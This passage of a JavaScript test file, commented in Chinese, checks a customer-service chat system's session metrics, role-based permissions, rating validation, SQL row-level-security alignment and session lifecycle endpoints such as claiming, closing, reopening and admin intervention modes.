  const sxSession = { id: 's1', channel: 'presale', user_id: 'u1', agent_id: 'a1', status: 'open',
    admin_mode: 'blind', rating: null, rated_at: null,
    first_response_seconds: null, opened_at: '2026-08-29T00:00:00.000Z' }
  const sxAt = new Date('2026-08-29T00:00:30.000Z')
  const sxAuto = sxTouch(sxSession, { sender_role: 'agent', auto_reply: true }, sxAt)
  assert(sxAuto.first_response_seconds === undefined,
    '自动回复不记首响——记了的话每个会话的首响都是零点几秒，§2.13 那个看板就测不出任何东西')
  const sxReal = sxTouch(sxSession, { sender_role: 'agent', auto_reply: false }, sxAt)
  assert(sxReal.first_response_seconds === 30, '客服真人回复记首响，从会话建立算起')
  const sxUser = sxTouch(sxSession, { sender_role: 'user', auto_reply: false }, sxAt)
  assert(sxUser.first_response_seconds === undefined && sxUser.last_user_message_at,
    '用户自己发消息不算「有人理他」')
  const sxSecond = sxTouch({ ...sxSession, first_response_seconds: 5 }, { sender_role: 'agent', auto_reply: false }, sxAt)
  assert(sxSecond.first_response_seconds === undefined, '首响只记第一次，第二条回复不能把它改掉')

  // §2.13 的两个率。分母必须是全部会话，包括一直没人回的那些——用「有过回复的会话」当分母会让
  // 这个数字永远接近 100%，而这个看板的全部意义就是暴露没人回的那些。
  const sxMetrics = sxSessionMetrics([
    { first_response_seconds: 10, timed_out: false },
    { first_response_seconds: 20, timed_out: false },
    { first_response_seconds: null, timed_out: true },
    { first_response_seconds: null, timed_out: false }
  ])
  assert(sxMetrics.total === 4, '总数是全部会话')
  assert(sxMetrics.answered === 2 && sxMetrics.reply_rate === 0.5,
    '响应率 = 2/4，没人回的两个留在分母里')
  assert(sxMetrics.timeout_rate === 0.25, '超时率 = 1/4')
  assert(sxMetrics.avg_first_response_seconds === 15,
    '均值只在有回复的那些上算——把没回复的当 0 会让这个数字越差越好看')
  assert(sxMetrics.median_first_response_seconds === 15,
    '中位数一起给：一个隔夜才回的会话会把均值彻底带偏')
  const sxSkew = sxSessionMetrics([
    { first_response_seconds: 10, timed_out: false },
    { first_response_seconds: 20, timed_out: false },
    { first_response_seconds: 6000, timed_out: false }
  ])
  assert(sxSkew.median_first_response_seconds === 20 && sxSkew.avg_first_response_seconds > 2000,
    '一个异常值把均值拉到 2000 以上而中位数还是 20——这就是两个都要给的理由')
  assert(sxSessionMetrics([]).reply_rate === 0, '空集合不能除零')
  assert(sxSessionMetrics([]).median_first_response_seconds === null, '空集合的中位数是 null，不是 0')

  // §2.10 两种介入模式。这里要钉住的不是「模式做了什么」，而是「模式什么都不做」——介入只决定
  // 管理员署谁的名（那部分在 sendMessage 的断言里），可见性一律与它无关。理由是 blind 现在是列默认值：
  // 只要 can_see 还看 admin_mode，每一个新会话在待接入队列里就是隐形的，谁也接不了。
  const sxAdminViewer = { userId: 'admin-1', group: 'admin' }
  const sxAgentViewer = { userId: 'a1', group: 'presale' }
  const sxUserViewer = { userId: 'u1', group: 'default' }
  const sxOther = { userId: 'a2', group: 'presale' }

  assert(sxAdminModes.join(',') === 'normal,blind', '§2.10 简化后只剩 normal 和 blind 两种介入模式')
  assert(sxDefaultMode === 'blind' && sxAdminModes.includes(sxDefaultMode),
    '默认是 blind——这正是任何基于 admin_mode 的遮挡都会遮住全部会话的原因')
  assert(/default 'blind'/.test(schemaSql), 'schema.sql 的列默认值要和 DEFAULT_ADMIN_MODE 一致')
  for (const mode of sxAdminModes) {
    const modeSession = { ...sxSession, admin_mode: mode }
    const sxModeAgent = sxCaps(modeSession, sxAgentViewer)
    assert(sxModeAgent.can_see && sxModeAgent.can_post, `${mode}：接待客服照样能看能发`)
    assert(sxCaps(modeSession, sxAdminViewer).can_post, `${mode}：管理员能发`)
    assert(sxCaps(modeSession, sxUserViewer).can_post, `${mode}：用户在自己的会话里能发`)
    assert(sxCaps({ ...modeSession, agent_id: null }, sxOther).can_claim,
      `${mode}：未接入的会话同渠道客服都能接——按 admin_mode 拦一档就是一个永远空着的队列`)
    assert(sxCaps({ ...modeSession, agent_id: null }, sxOther).can_see,
      `${mode}：能接就必须能看，否则队列里是一行点得动但打不开的会话`)
  }
  assert(!sxCaps(sxSession, sxOther).can_see, '别的客服看不到已被接走的会话')
  assert(!sxCaps({ ...sxSession, status: 'closed' }, sxUserViewer).can_post, '关闭的会话不能发言')
  assert(sxCaps({ ...sxSession, status: 'closed' }, sxUserViewer).can_reopen, '关闭的会话用户能重开')
  assert(!sxCaps(sxSession, sxUserViewer).can_see_revisions,
    '用户看不到撤回原文和编辑历史——这是 §2.11 的全部内容')
  assert(sxCaps(sxSession, sxAgentViewer).can_see_revisions, '客服看得到')

  // §2.14 打分的资格。三条都在 can_rate 里，因为界面要按它决定画不画那五颗星。
  assert(!sxCaps(sxSession, sxUserViewer).can_rate, '会话还开着不能评价')
  const sxClosedForUser = { ...sxSession, status: 'closed' }
  assert(sxCaps(sxClosedForUser, sxUserViewer).can_rate, '关闭之后用户能评价')
  assert(!sxCaps(sxClosedForUser, sxAgentViewer).can_rate, '客服不能给自己打分')
  assert(!sxCaps(sxClosedForUser, sxAdminViewer).can_rate, '管理员也不行——这是用户对服务的评价')
  assert(!sxCaps({ ...sxClosedForUser, rated_at: '2026-08-29T00:01:00.000Z', rating: 0 }, sxUserViewer).can_rate,
    '评过就不能再评。判据是 rated_at 而不是 rating——按 rating 判会让一个 0 分的差评永远可以被改成 5 分')

  // normalizeRating：0 是合法的差评，null/空串/超范围都不是。
  assert(sxRatingRange[0] === 0 && sxRatingRange[1] === 5, '§2.14 的分数范围是 0~5')
  assert(sxNormalizeRating(0) === 0, '0 分要活着走出来——落到假值分支就等于「没评价」')
  assert(sxNormalizeRating(5) === 5 && sxNormalizeRating('3') === 3, '字符串数字也认')
  assert(sxNormalizeRating(4.4) === 4 && sxNormalizeRating(4.6) === 5, '小数四舍五入')
  // 这一串里 null / '' / [] / false 是同一个陷阱的四种写法：Number() 把它们全变成 0，而 0 是合法的差评。
  // 混过去的后果不是一次报错，是一条 rated_at 已经写上、内容是「0 分」的记录，用户再也改不动。
  for (const bad of [-1, 6, 'x', null, undefined, '', '   ', NaN, Infinity, -Infinity, true, false, [], {}]) {
    assert(sxNormalizeRating(bad) === null, `${JSON.stringify(bad) ?? String(bad)} 不该被当成一个分数`)
  }

  // 和 SQL 逐条对齐。这两个门函数是 RLS 的实现，JS 那边判松了就是接口放行而数据库拦住（前端报错），
  // 判紧了就是接口拦住而数据库放行（功能不可用）。两种都是 bug，所以要钉住同一份语义。
  const sxSeeSql = schemaSql.match(/create or replace function private\.can_see_session[\s\S]*?\$;/)[0]
  const sxPostSql = schemaSql.match(/create or replace function private\.can_post_session[\s\S]*?\$;/)[0]
  // 这两条是反向断言：admin_mode 一旦重新出现在门函数里，浏览器那侧的可见性就和 sessionCapabilities
  // 分道扬镳了，而症状是「工作台列表里有这条会话，点开是一句 RLS 拒绝」。
  assert(!/admin_mode/.test(sxSeeSql), 'can_see_session 里不能再有 admin_mode——blind 是默认值，遮一档就是遮全部')
  assert(!/admin_mode/.test(sxPostSql), 'can_post_session 里不能再有 admin_mode')
  assert(/serves_channel/.test(sxSeeSql), 'can_see_session 用 serves_channel 判队列可见性')
  assert(/status = 'open'/.test(sxPostSql), 'can_post_session 要求会话是开着的')
  // 迁移那一段：已经存在的库里还躺着 none/readonly，不折成 blind 的话 CHECK 加不上去。
  assert(/update public\.cs_sessions set admin_mode='blind' where admin_mode in \('none','readonly'\)/.test(schemaSql),
    'schema.sql 要把旧的 none/readonly 折成 blind，否则新 CHECK 在有数据的库上直接失败')
  assert(/check \(admin_mode in \('normal','blind'\)\)/.test(schemaSql), 'CHECK 要和 ADMIN_MODES 一致')

  // Realtime 发布。两端的「实时」全靠它：cs.ts 的 subscribe 订阅一条会话，CsPage.vue 的 subscribeList
  // 订阅整张 cs_sessions。表不在发布里的表现最难查——订阅本身成功（频道状态 SUBSCRIBED），只是永远
  // 收不到行，没有任何报错，看起来就是「客服延迟很高」「关了会话对面不知道」。
  const sxPubBlock = schemaSql.match(/pg_publication[\s\S]*?end \$\$;/)?.[0] || ''
  assert(/supabase_realtime/.test(sxPubBlock), 'schema.sql 要把实时发布写进来，不能只在控制台上点过')
  for (const table of ['cs_sessions', 'cs_messages']) {
    assert(new RegExp(`alter publication supabase_realtime add table public\\.${table}`).test(sxPubBlock),
      `${table} 要加进 supabase_realtime，否则那一侧的推送永远不到`)
    assert(new RegExp(`tablename = '${table}'`).test(sxPubBlock),
      `${table} 要先查 pg_publication_tables 再 add：已经在发布里的表再 add 一次是 42710，会让整个文件重跑时断在这里`)
  }
  assert(/pg_publication where pubname = 'supabase_realtime'/.test(sxPubBlock),
    '发布本身可能不存在（自建库、或被删过），那时候 alter 是 42704，要分开判')

  // §2.11 撤回的呈现。撤回原文不在 cs_messages 行里——它被搬去 cs_message_revisions 了。
  const sxRecalled = { id: 'm1', body: '', recalled: true, sender_role: 'user', authored_by: 'admin-1' }
  const sxRevs = [{ message_id: 'm1', kind: 'recall', body: '我说错了', format: 'plain', revision: 1 }]
  const sxForUser = sxPresent(sxRecalled, sxUserViewer, sxRevs)
  assert(sxForUser.body === '' && sxForUser.recalled_body === undefined,
    '用户那侧拿不到原文，连字段都不该出现')
  assert(sxForUser.authored_by === undefined,
    '真作者也不给用户——给了就等于把 blind 模式下的介入告诉了用户')
  const sxForAgent = sxPresent(sxRecalled, sxAgentViewer, sxRevs)
  assert(sxForAgent.recalled_body === '我说错了' && sxForAgent.body === '',
    '客服看得到原文，但挂在单独字段上——塞回 body 的话前端画不出「已撤回」的样式')

  const sxEdited = { id: 'm2', body: '第二版', edited_at: '2026-08-29T00:00:00.000Z', sender_role: 'user' }
  const sxEditRevs = [
    { message_id: 'm2', kind: 'edit', body: '第一版', format: 'plain', revision: 1 },
    { message_id: 'm2', kind: 'edit', body: '第零版', format: 'plain', revision: 0 }
  ]
  const sxEditForAgent = sxPresent(sxEdited, sxAgentViewer, sxEditRevs)
  assert(sxEditForAgent.edit_history?.length === 2, '客服看得到编辑历史')
  assert(sxEditForAgent.edit_history[0].revision === 0, '编辑历史按 revision 升序，否则时间线是倒的')
  assert(sxPresent(sxEdited, sxUserViewer, sxEditRevs).edit_history === undefined, '用户看不到编辑历史')

  // §2.5 超时判定。
  const sxIdleOpts = { presaleMinutes: 10, postsaleMinutes: 30, now: new Date('2026-08-29T00:11:00.000Z') }
  assert(sxIdle({ status: 'open', channel: 'presale', last_activity_at: '2026-08-29T00:00:00.000Z' }, sxIdleOpts),
    '售前 10 分钟没动就算超时')
  assert(!sxIdle({ status: 'open', channel: 'postsale', last_activity_at: '2026-08-29T00:00:00.000Z' }, sxIdleOpts),
    '同样的 11 分钟对售后不算超时——两个渠道的阈值不同')
  // 已关闭的会话不该再被判成超时：清理任务会一遍遍地对它发一次超时文案。
  assert(!sxIdle({ status: 'closed', channel: 'presale', last_activity_at: '2026-08-29T00:00:00.000Z' }, sxIdleOpts),
    '关闭的会话不参与超时判定')
  // 0 分钟的意思是「不自动关闭」，不是「立刻关闭」。反过来实现的话，管理员想关掉这个功能的那次
  // 配置会把全站的会话在下一次清理里全部关掉。
  assert(!sxIdle({ status: 'open', channel: 'presale', last_activity_at: '2026-08-29T00:00:00.000Z' },
    { presaleMinutes: 0, postsaleMinutes: 30, now: new Date('2026-09-29T00:00:00.000Z') }),
    '阈值 0 表示不自动关闭')
  // 没有 last_activity_at 的会话按 created_at 算——两个都缺才不判。
  assert(sxIdle({ status: 'open', channel: 'presale', created_at: '2026-08-29T00:00:00.000Z' }, sxIdleOpts),
    'last_activity_at 缺失时回落到 created_at')
  assert(sxStale('2026-08-29T00:00:00.000Z', 90, new Date('2026-08-29T00:02:00.000Z')),
    '心跳超过 90 秒算掉线')
  assert(sxStale(null, 90, new Date()), '从来没打过心跳算掉线，不是算在线')

  // §2.9 超时文案的四个键。渠道和收件人两两组合，少一个键的症状是超时后一方收到空白提示。
  assert(sxTimeoutKeys('presale').user === 'cs_timeout_text_presale_user', '售前给用户的文案键')
  assert(sxTimeoutKeys('postsale').agent === 'cs_timeout_text_postsale_agent', '售后给客服的文案键')
  for (const key of ['presale_user', 'presale_agent', 'postsale_user', 'postsale_agent']) {
    assert(schemaSql.includes(`cs_timeout_text_${key}`), `site_settings 里有 cs_timeout_text_${key} 的默认值`)
  }

  // §3.1 关键词匹配与选一条。一次只发一条，否则「我要退款，能退多少」会同时命中三条规则，
  // 用户收到三段话。
  assert(sxMatch('我要退款', ['退款'], 'contains'), 'contains 命中')
  assert(!sxMatch('我要退款', ['发票'], 'contains'), '不含就是不命中')
  assert(sxMatch('退款', ['退款'], 'exact') && !sxMatch('我要退款', ['退款'], 'exact'), 'exact 要整句相等')
  assert(sxMatch('退款怎么弄', ['退款'], 'starts_with'), 'starts_with')
  assert(!sxMatch('我要退款', ['退款'], 'starts_with'), 'starts_with 不能当成 contains')
  assert(!sxMatch('我要退款', [], 'contains'), '空关键词列表不能匹配一切')

  const sxRules = [
    { id: 'r-low', enabled: true, trigger: 'keyword', channel: 'both', keywords: ['退款'],
      match_mode: 'contains', body: 'A', priority: 1, created_at: '2026-01-01T00:00:00.000Z' },
    { id: 'r-high', enabled: true, trigger: 'keyword', channel: 'both', keywords: ['退款'],
      match_mode: 'contains', body: 'B', priority: 9, once_per_session: true,
      created_at: '2026-01-02T00:00:00.000Z' },
    { id: 'r-presale', enabled: true, trigger: 'keyword', channel: 'presale', keywords: ['退款'],
      match_mode: 'contains', body: 'C', priority: 99, created_at: '2026-01-03T00:00:00.000Z' }
  ]
  const sxHit = sxPickReply(sxRules, { trigger: 'keyword', channel: 'postsale', text: '我要退款' })
  assert(sxHit?.id === 'r-high', 'priority 高的赢，且渠道不符的那条不参与')
  assert(sxPickReply(sxRules, { trigger: 'keyword', channel: 'presale', text: '我要退款' })?.id === 'r-presale',
    '售前渠道下那条专属规则赢')
  assert(sxPickReply(sxRules, { trigger: 'keyword', channel: 'postsale', text: '我要退款',
    alreadySentRuleIds: ['r-high'] })?.id === 'r-low', 'once_per_session 已发过的跳过，换下一条')
  // 跳过只对带 once_per_session 的规则生效。不带这个标记的规则本来就该每次都发（「请稍等」那种），
  // 一律跳过的话，用户第二次问同一件事会得不到任何回应。
  assert(sxPickReply(sxRules, { trigger: 'keyword', channel: 'postsale', text: '我要退款',
    alreadySentRuleIds: ['r-low'] })?.id === 'r-high', '没有 once_per_session 的规则不受已发列表影响')
  assert(sxPickReply(sxRules, { trigger: 'keyword', channel: 'postsale', text: '你好' }) === null,
    '没命中就是 null，不是随便发一条')
  assert(sxPickReply(sxRules, { trigger: 'session_open', channel: 'postsale', text: '' }) === null,
    'trigger 不符的规则不参与')
}
console.log('CS logic: OK')

// --- §2 会话接口 -----------------------------------------------------------------------------------
// 这些接口跑在 service client 上，RLS 不生效，所以 update 上的过滤条件就是全部的并发保护和授权检查。
// 下面每一条 assert 对应一个「漏掉这个条件会发生什么」。
//
// cs_sessions 的桩多数用函数给法而不是数组：assignAgent 和 touchSession 也查这张表，夹在业务的
// 两次调用中间，按次序数会数错，而数错的表现是一次断言在改了无关代码之后忽然失败。
{
  const sxSid = '11111111-1111-1111-1111-111111111111'
  const sxOid = '22222222-2222-2222-2222-222222222222'
  const sxUid = '33333333-3333-3333-3333-333333333333'
  const sxAid = '44444444-4444-4444-4444-444444444444'
  const sxMid = '55555555-5555-5555-5555-555555555555'
  const sxOpen = {
    id: sxSid, channel: 'presale', user_id: sxUid, order_id: null, agent_id: sxAid,
    // admin_mode 的默认值是 blind（§2.10 简化之后），这条 fixture 跟着列默认值走：写 'none' 的话，
    // 它测的是一个数据库里不可能存在的状态，而真正会出问题的那个状态（blind）反而没人测。
    status: 'open', admin_mode: 'blind', first_response_seconds: null, timed_out: false,
    reopened_count: 0, opened_at: '2026-08-29T00:00:00.000Z', created_at: '2026-08-29T00:00:00.000Z'
  }
  const sxAsUser = { userId: sxUid, group: 'default' }
  const sxAsAgent = { userId: sxAid, group: 'presale' }
  const sxAsAdmin = { userId: 'admin-1', group: 'admin' }
  const SX_DEFAULTS = {
    cs_max_concurrent_default: 5, cs_heartbeat_timeout_seconds: 90, cs_activity_basis: 'message',
    cs_timeout_presale_minutes: 10, cs_timeout_postsale_minutes: 30,
    cs_no_agent_text: '当前无人在线', cs_welcome_text: '请描述您的问题',
    cs_allow_html: false, cs_allow_bbcode: true, cs_typing_trigger: 'keypress',
    cs_upload_max_image_mb: 10, cs_upload_max_file_mb: 25, cs_upload_max_video_mb: 100
  }
  // site_settings 一次取多个 key，形状是 { value: ... } 的 jsonb。
  const sxSettings = (over = {}) => entry => {
    const all = { ...SX_DEFAULTS, ...over }
    const keys = entry.in?.key || Object.keys(all)
    return { data: keys.filter(k => k in all).map(k => ({ key: k, value: { value: all[k] } })), error: null }
  }

  // §2.1 开会话：已有一个开着的就还回去，不新建。用户在商品页和结算页各点一次客服按钮，
  // 期望是回到同一个对话，而不是一句唯一约束冲突。
  const sxDbExisting = recorder({ cs_sessions: { data: sxOpen, error: null }, site_settings: sxSettings() })
  const sxAgain = await sxOpenSession(sxDbExisting, sxAsUser, { channel: 'presale' })
  assert(sxAgain.status === 200 && sxAgain.body.created === false, '已有会话时返回 200 且 created=false')
  assert(!sxDbExisting.calls.some(c => c.op === 'insert' && c.table === 'cs_sessions'),
    '已有会话时不该再插一行——插了就撞 cs_one_open_session')
  assert(sxAgain.body.capabilities?.can_post === true, '答复里带上能力位，前端不用自己解 admin_mode')

  // 售前会话的查询必须用 is('order_id', null)，不能用 eq。eq 在 PostgREST 里匹配不到任何行，
  // 于是每次点客服都以为没有会话，然后新建，然后撞唯一索引。
  const sxLookup = sxDbExisting.calls.find(c => c.table === 'cs_sessions' && c.op === 'select')
  assert(sxLookup.is && 'order_id' in sxLookup.is, "售前会话按 is('order_id', null) 查，不是 eq")
  assert(sxLookup.filters.status === 'open' && sxLookup.filters.user_id === sxUid,
    '按用户和 open 状态查——少了 status 会把三个月前关掉的会话还回去')

  // §2.1 售后必须带订单，且订单必须是自己的。
  const sxNoOrder = await sxOpenSession(recorder(), sxAsUser, { channel: 'postsale' })
  assert(sxNoOrder.status === 400, '售后会话不带订单要拒绝')
  const sxPresaleOrder = await sxOpenSession(recorder(), sxAsUser, { channel: 'presale', order_id: sxOid })
  assert(sxPresaleOrder.status === 400, '售前会话不能绑订单——库里的 check 也不允许')
  const sxOthersOrder = await sxOpenSession(
    recorder({ orders: { data: { id: sxOid, user_id: 'someone-else' }, error: null } }),
    sxAsUser, { channel: 'postsale', order_id: sxOid })
  assert(sxOthersOrder.status === 404,
    '别人的订单答 404，和「订单不存在」同一个答复——分开答就是一个能探测订单号的接口')

  // 新建时没有在线客服要给一句话，而不是让用户对着空窗口等（§2.12）。
  const sxDbNew = recorder({
    cs_sessions: entry => {
      if (entry.op === 'insert') return { data: { ...sxOpen, agent_id: null }, error: null }
      // assignAgent 查负载：拿的是一批行，形状必须是数组。
      if (entry.selected === 'agent_id') return { data: [], error: null }
      return { data: null, error: null }
    },
    cs_agents: { data: [], error: null },
    cs_messages: { data: { id: sxMid, session_id: sxSid, sender_role: 'system', auto_reply: false }, error: null },
    cs_auto_replies: { data: [], error: null },
    cs_session_events: { data: null, error: null },
    site_settings: sxSettings()
  })
  const sxCreated = await sxOpenSession(sxDbNew, sxAsUser, { channel: 'presale' })
  assert(sxCreated.status === 201 && sxCreated.body.created === true, '新建返回 201')
  const sxSysMsgs = sxDbNew.calls.filter(c => c.table === 'cs_messages' && c.op === 'insert')
  assert(sxSysMsgs.some(c => String(c.payload.body).includes('当前无人在线')),
    '没有在线客服时发出 cs_no_agent_text，用户才知道不是自己网络坏了')
  assert(sxSysMsgs.some(c => c.payload.auto_reply === true && String(c.payload.body).includes('请描述')),
    '没有配 session_open 规则时兜底发 cs_welcome_text，并且标成 auto_reply——否则它会被算进首响')
  const sxOpenEvt = sxDbNew.calls.find(c => c.table === 'cs_session_events' && c.op === 'insert')
  assert(sxOpenEvt?.payload.kind === 'queued',
    '没分到人时事件是 queued 而不是 assigned：事后查「这个会话当时有没有人」就靠这一行')

  // §2.12 接入：必须带 is('agent_id', null)。两个客服同时点接入时只有一个能拿到行——
  // 先查再更新的写法会让两个人接到同一个会话，然后互相看着对方的回复。
  const sxClaimDb = (load, cap, row = null) => recorder({
    cs_sessions: entry => {
      if (entry.op === 'update') return { data: { ...(row || sxOpen), agent_id: 'me' }, error: null }
      // 负载走 head+count，结果在 count 上而不是 data 上。
      if (entry.selectOpts?.count === 'exact') return { count: load, data: null, error: null }
      return { data: { ...(row || sxOpen), agent_id: null }, error: null }
    },
    cs_agents: { data: { max_concurrent: cap }, error: null },
    cs_session_events: { data: null, error: null },
    site_settings: sxSettings()
  })
  const sxDbClaim = sxClaimDb(1, null)
  const sxClaimed = await sxClaimSession(sxDbClaim, { userId: 'me', group: 'presale' }, sxSid)
  assert(sxClaimed.status === 200, '空闲会话可以接入')
  const sxClaimUpd = sxDbClaim.calls.find(c => c.table === 'cs_sessions' && c.op === 'update')
  assert(sxClaimUpd.is && 'agent_id' in sxClaimUpd.is,
    "接入必须带 is('agent_id', null)：这一条就是两个客服抢同一个会话时的全部保护")
  assert(sxClaimUpd.filters.status === 'open', '接入必须带 status=open：不能接一个已关闭的会话')
  assert(sxClaimUpd.payload.agent_id === 'me', '只把 agent_id 改成自己，不能改成别人')

  // 上限也要在接入这条路径上判。判在自动分配里管不到主动接入，少这一处，一个客服能手动把自己
  // 接到二十个会话上。
  const sxOverCap = await sxClaimSession(sxClaimDb(5, 2), { userId: 'me', group: 'presale' }, sxSid)
  assert(sxOverCap.status === 409 && /上限（2）/.test(sxOverCap.body.error),
    '超过并发上限要拒绝接入，并且把上限数字说出来——「已达上限」不告诉客服该关几个')
  // max_concurrent 为 null 时用全站默认，不是「无限」。
  const sxDefaultCap = await sxClaimSession(sxClaimDb(5, null), { userId: 'me', group: 'presale' }, sxSid)
  assert(sxDefaultCap.status === 409, 'null 上限回落到 cs_max_concurrent_default（5），不是不限')

  // 渠道不符的客服不能接。
  const sxWrongChannel = await sxClaimSession(
    recorder({ cs_sessions: { data: { ...sxOpen, channel: 'postsale', agent_id: null }, error: null } }),
    { userId: 'me', group: 'presale' }, sxSid)
  assert(sxWrongChannel.status === 403, '售前客服不能接售后会话')
  // blind 会话照样能接。这一条曾经反着写（「已被管理员接管，客服接不了」），§2.10 简化之后 blind 是列
  // 默认值，于是那条规则的含义变成了「任何会话都接不了」——队列里每一行都点不动。
  const sxClaimBlind = await sxClaimSession(
    sxClaimDb(1, null, { ...sxOpen, admin_mode: 'blind', agent_id: null }),
    { userId: 'me', group: 'presale' }, sxSid)
  assert(sxClaimBlind.status === 200, 'blind 是默认值，按它拦一档就是把整个待接入队列锁死')

  // §2.5 关闭：必须带 status='open'。少了它，一次重复点击会把 closed_at 覆盖成第二次点击的时间，
  // 而那条时间被 §2.13 用来算时长。
  const sxDbClose = recorder({
    cs_sessions: entry => entry.op === 'update'
      ? { data: { ...sxOpen, status: 'closed' }, error: null } : { data: sxOpen, error: null },
    cs_messages: { data: { id: sxMid, sender_role: 'system' }, error: null },
    cs_session_events: { data: null, error: null }
  })
  const sxClosed = await sxCloseSession(sxDbClose, sxAsUser, sxSid, '问题解决了')
  assert(sxClosed.status === 200, '会话所属用户可以关闭')
  const sxCloseUpd = sxDbClose.calls.find(c => c.table === 'cs_sessions' && c.op === 'update')
  assert(sxCloseUpd.filters.status === 'open', "关闭必须带 status='open'")
  assert(sxCloseUpd.payload.closed_by === sxUid, '记下是谁关的')
  const sxCloseMsg = sxDbClose.calls.find(c => c.table === 'cs_messages' && c.op === 'insert')
  assert(String(sxCloseMsg.payload.body).includes('用户'),
    '用户关的和客服关的要发不同的文案——同一句话会让用户以为是客服把他关掉了')

  const sxCloseByStranger = await sxCloseSession(
    recorder({ cs_sessions: { data: sxOpen, error: null } }),
    { userId: 'nobody', group: 'presale' }, sxSid, '')
  assert(sxCloseByStranger.status === 403, '不相关的客服不能关别人的会话')
  const sxCloseTwice = await sxCloseSession(
    recorder({ cs_sessions: entry => entry.op === 'update'
      ? { data: null, error: null } : { data: sxOpen, error: null } }),
    sxAsUser, sxSid, '')
  assert(sxCloseTwice.status === 409, '拿不到行说明别人先关了，答 409 而不是假装成功')

  // §2.5 重开：首响和超时标记要清零。留着旧值的话，一个「三天前回过、今天重开又没人理」的会话
  // 会被 §2.13 算成已响应。
  const sxWasClosed = {
    ...sxOpen, status: 'closed', first_response_seconds: 12, timed_out: true, reopened_count: 1
  }
  const sxDbReopen = recorder({
    cs_sessions: entry => {
      if (entry.op === 'update') return { data: { ...sxOpen, reopened_count: 2 }, error: null }
      // 按 id 查是 loadSession；按 status='open' 查是「有没有另一个开着的」，那次要空。
      if (entry.filters.id === sxSid) return { data: sxWasClosed, error: null }
      return { data: null, error: null }
    },
    cs_agents: { data: { online: true }, error: null },
    cs_session_events: { data: null, error: null },
    site_settings: sxSettings()
  })
  const sxReopened = await sxReopenSession(sxDbReopen, sxAsUser, sxSid)
  assert(sxReopened.status === 200, '关闭的会话可以重开')
  const sxReopenUpd = sxDbReopen.calls.find(c => c.table === 'cs_sessions' && c.op === 'update')
  assert(sxReopenUpd.payload.first_response_seconds === null,
    '重开要把首响清零：重开等于重新开始等待')
  assert(sxReopenUpd.payload.timed_out === false, '超时标记也要清掉')
  assert(sxReopenUpd.payload.opened_at && sxReopenUpd.payload.opened_at !== sxOpen.opened_at,
    'opened_at 要刷新——首响是从这个时间起算的，不刷新的话下一次回复会算出三天的首响')
  assert(sxReopenUpd.payload.reopened_count === 2, 'reopened_count 递增')
  assert(sxReopenUpd.payload.agent_id === sxAid,
    '原客服还在线就接回给他（§2.5「由同一客服接回」）')
  assert(sxReopenUpd.filters.status === 'closed',
    "重开必须带 status='closed'：两次点击不能把一个已经重开的会话再重开一次")

  // 原客服离线时不能失败——用户的问题没解决，而他唯一的入口报错。要走一次重新分配。
  const sxDbReopenOffline = recorder({
    cs_sessions: entry => {
      if (entry.op === 'update') return { data: { ...sxOpen, agent_id: 'other' }, error: null }
      if (entry.filters.id === sxSid) return { data: sxWasClosed, error: null }
      if (entry.selected === 'agent_id') return { data: [], error: null }
      return { data: null, error: null }
    },
    cs_agents: entry => entry.filters.user_id
      ? { data: { online: false }, error: null }
      : { data: [{ user_id: 'other', online: true, max_concurrent: 5, last_heartbeat: new Date().toISOString() }], error: null },
    user_profiles: { data: [{ user_id: 'other', group_name: 'presale' }], error: null },
    cs_session_events: { data: null, error: null },
    site_settings: sxSettings()
  })
  const sxReopenOffline = await sxReopenSession(sxDbReopenOffline, sxAsUser, sxSid)
  assert(sxReopenOffline.status === 200, '原客服离线时仍然重开')
  const sxOfflineUpd = sxDbReopenOffline.calls.find(c => c.table === 'cs_sessions' && c.op === 'update')
  assert(sxOfflineUpd.payload.agent_id === 'other', '原客服离线就重新分配一个在线的')

  // 同渠道已经有一个开着的会话时，重开会撞唯一索引，所以先把那个还回去。
  const sxReopenDup = await sxReopenSession(
    recorder({ cs_sessions: entry => entry.filters.id === sxSid
      ? { data: sxWasClosed, error: null } : { data: sxOpen, error: null } }),
    sxAsUser, sxSid)
  assert(sxReopenDup.status === 409 && sxReopenDup.body.session,
    '已有进行中会话时答 409 并把那个会话带上，前端才能直接跳过去')

  // §2.10 介入模式：只有管理员能切，且要留痕。
  const sxModeByAgent = await sxSetAdminMode(recorder(), sxAsAgent, sxSid, 'blind')
  assert(sxModeByAgent.status === 403, '客服不能自己切介入模式')
  const sxBadMode = await sxSetAdminMode(recorder(), sxAsAdmin, sxSid, 'invisible')
  assert(sxBadMode.status === 400, '不认识的模式要拒绝，不能落库让 check 去报约束名')
  // 旧的两种模式名现在也必须被拒。留着它们就是留着一条把 none/readonly 写回库里的路，
  // 而那两个值过不了新的 CHECK——报出来的是一句约束名，不是人话。
  for (const gone of ['none', 'readonly']) {
    const sxGone = await sxSetAdminMode(recorder(), sxAsAdmin, sxSid, gone)
    assert(sxGone.status === 400, `${gone} 已经不是一个模式了`)
  }
  const sxDbMode = recorder({
    cs_sessions: entry => entry.op === 'update'
      ? { data: { ...sxOpen, admin_mode: 'normal' }, error: null } : { data: sxOpen, error: null },
    cs_messages: { data: { id: sxMid, sender_role: 'admin' }, error: null },
    cs_session_events: { data: null, error: null }
  })
  const sxMode = await sxSetAdminMode(sxDbMode, sxAsAdmin, sxSid, 'normal')
  assert(sxMode.status === 200, '管理员可以切')
  const sxModeUpd = sxDbMode.calls.find(c => c.table === 'cs_sessions' && c.op === 'update')
  assert(sxModeUpd.payload.admin_id === 'admin-1', '记下是哪个管理员在介入')
  const sxModeMsg = sxDbMode.calls.find(c => c.table === 'cs_messages' && c.op === 'insert')
  assert(sxModeMsg.payload.visible_to_user === false,
    '介入本身对用户不可见——可见就等于告诉用户「现在是管理员在替客服说话」')
  assert(sxModeMsg.payload.sender_role === 'system',
    '留痕是状态变更而不是发言：写成 admin 的话，管理员自己打开会话会看到一条署名「我」、内容是「我刚切了模式」的气泡')
  const sxModeEvt = sxDbMode.calls.find(c => c.table === 'cs_session_events' && c.op === 'insert')
  assert(sxModeEvt.payload.detail?.from === 'blind' && sxModeEvt.payload.detail?.to === 'normal',
    '事件里记下从哪个模式切到哪个——只记「切过」查不出当时用户看到的是谁的名字')

  // 切回 blind。这里曾经断言「切回 none 要把 admin_id 清掉」，而 §2.10 简化之后 blind 就是列默认值：
  // 清掉 admin_id 会让「这条会话有没有人介入过」这个唯一的判据在一次切换里丢掉。
  const sxDbModeBack = recorder({
    cs_sessions: entry => entry.op === 'update'
      ? { data: sxOpen, error: null } : { data: { ...sxOpen, admin_mode: 'normal' }, error: null },
    cs_messages: { data: { id: sxMid }, error: null },
    cs_session_events: { data: null, error: null }
  })
